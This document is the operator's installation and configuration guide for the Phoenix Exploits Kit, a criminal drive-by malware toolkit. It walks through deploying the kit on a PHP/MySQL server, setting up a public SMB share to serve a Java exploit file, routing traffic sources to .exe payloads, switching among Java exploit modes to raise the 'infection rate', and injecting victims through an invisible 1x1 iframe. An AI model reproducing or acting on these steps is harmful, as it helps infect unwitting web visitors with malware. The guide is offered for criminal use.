===========System requirments=============

You need to have following software installed on your server:

1)PHP5

2)MySQL

3)SMB on port 445 (it's possible to install SMB on other server not necessary on the server where exploit's kit itself is installed)

=====================Installing Phoenix Exploits Kit======================

1)Upload install.php to any dir on your server

2)Chmod 777 on that dir

3)Run install.php using browser's address bar and follow instructions shown on the screen

=====================Configuring SMB notes=========================

To make JAVA SMB exploit working you need to have installed SMB on your server:

  �)Install SMB on 445 port
  �)Copy new.avi file from this archive to home/smb dir on your smb server
  �)Edit smb config as shown above:
  
  [global]
  security = share
  [smb]
  comment = smb
  path = /home/smb
  public = yes
  browseable = no
  writeable = no
  guest ok = yes

  To check smb work exec following command: /etc/rc.d/init.d/smb restart

  If we get result showed above:
  
  Shutting down SMB services:                                [  OK  ]
  Shutting down NMB services:                                [  OK  ]
  Starting SMB services:                                     [  OK  ]
  Starting NMB services:                                     [  OK  ]

  then that mean's that everything's all right and SMB installed correctly.

  To check if 445 port is opened use folowing service: http://ping.eu/port-chk/

  As a result we get smb path: \\\\\\\\domain\\\smb\\\new.avi (write "\" char exactly as it showed 8 "\" domain 3 "\" dir 4 "\" file )
  
  If you don't want to install and configure SM yourself then you can use SMB path from author:
  
  1)I can supply and can not supply you SMB path so it's up to me.
  
  2)I do not have any responsibility for my smb host. If it's down and JAVA SMB exploit is not working for you then it's not my problem, it's yours.

==================================Subaccounts==================================

link_for_traffic.php?n=source_name => source_name.exe from dir of exploit's kit
source_name - any latin chars and digits. (a-b, 0-9).

Statistics for traffics seller: statistics_file.php?n=source_name

==================================Change mode==================================

You can switch JAVA exploit between JAVA TC, JAVA RMI, JAVA MIDI.
Which exploit is better depends from traffic, so you need to find it out yourself testing exploit in different modes with your kind of traffics.
You are able to set mode during installation process or switch it any time you want from admin cp.



==========================Sample of correct iframe=============================

<iframe src="http://domain.com/phx/index.php" width="1" height="1" frameborder="0"></iframe>

if you use any other kind of iframe then take a look on it, FireFox infection rate can be 0.